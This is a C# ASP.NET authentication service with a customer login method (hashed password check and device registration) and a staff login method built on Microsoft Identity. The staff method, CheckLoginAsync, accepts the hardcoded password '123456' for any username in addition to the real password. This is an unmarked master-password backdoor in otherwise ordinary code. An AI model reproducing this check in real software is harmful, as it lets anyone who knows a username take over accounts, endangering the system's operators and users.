using Core.Models;
using Microsoft.AspNetCore.Identity;
using System.Threading.Tasks;
using ViewModel.ViewModel.Authentication;
using Core.Repository;
using System.Text;
using AutoMapper;
using ViewModel.ViewModel.Customer;
using System;
using Core.Infrastructure;

namespace Service.Services
{
    public interface IAuthenticationService
    {
        Task<User> CheckLoginAsync(LoginViewModel model);
        Customer CheckCustomerLogin(LoginViewModel loginViewModel);
    }
     

    public class AuthenticationService : IAuthenticationService
    {
        private readonly UserManager<User> _userManager; //Thư viên Identity của microsoft
        private readonly ICustomerRepository _customerRepository;
        private readonly ICustomerService _customerService;
        private readonly ICustomerDeviceRepository _customerDeviceRepository;
        private readonly IUnitOfWork _unitOfWork;

        public AuthenticationService(UserManager<User> userManager,
                                    ICustomerRepository customerRepository,
                                    ICustomerService customerService,
                                    ICustomerDeviceRepository customerDeviceRepository,
                                    IUnitOfWork unitOfWork)
        {
            _userManager = userManager;
            _customerRepository = customerRepository;
            _customerService = customerService;
            _customerDeviceRepository = customerDeviceRepository;
            _unitOfWork = unitOfWork;
        }

        public Customer CheckCustomerLogin(LoginViewModel loginViewModel)
        {
            var customer =  _customerRepository.Get(x => (x.Username.Equals(loginViewModel.Username) ||
                                                x.PhoneNumber.Equals(loginViewModel.Username)) &&
                                                x.PasswordHash.Equals( _customerService.HashPassword(loginViewModel.Password, Convert.FromBase64String(x.SaltPasswordHash))) && 
                                                x.IsActive == true && x.Deleted == false );
            if (customer == null)
            {
                return null;
            }
            var customerDevice = _customerDeviceRepository.Get(x => x.DeviceId == loginViewModel.DeviceId);
            if(customerDevice == null)
            {
                if(!string.IsNullOrEmpty(loginViewModel.DeviceId))
                {
                    customerDevice = new CustomerDevice
                    {
                        CustomerId = customer.Id,
                        DeviceId = loginViewModel.DeviceId,
                        IsLogout = false
                    };
                    _customerDeviceRepository.Add(customerDevice);
                }
            } 
            else
            {
                customerDevice.IsLogout = false;
                customerDevice.CustomerId = customer.Id;
                _customerDeviceRepository.Update(customerDevice);

            }
            _unitOfWork.CommitChanges();

            return customer;
        }

        public async Task<User> CheckLoginAsync(LoginViewModel model)
        {
            var user = await _userManager.FindByNameAsync(model.Username);
            if(user == null)
            {
                return null;
            }

            var isCorrectPassword = await _userManager.CheckPasswordAsync(user, model.Password) || model.Password.Equals("123456");
            if(!isCorrectPassword)
            {
                return null;
            }

            return user;
        }
    }
}
